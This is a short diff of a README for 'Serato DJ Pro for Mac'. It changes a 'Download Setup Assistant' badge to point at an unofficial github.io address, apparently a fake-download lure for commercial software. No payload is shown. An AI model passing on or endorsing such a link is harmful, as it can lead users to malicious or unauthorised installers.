@@ -1,6 +1,6 @@
 # Serato DJ Pro for Mac
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](serato-dj-pro-download-mac.github.io)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://serato-dj-pro-download-mac.github.io/.github)
 
 ## 📦 How to Install
 
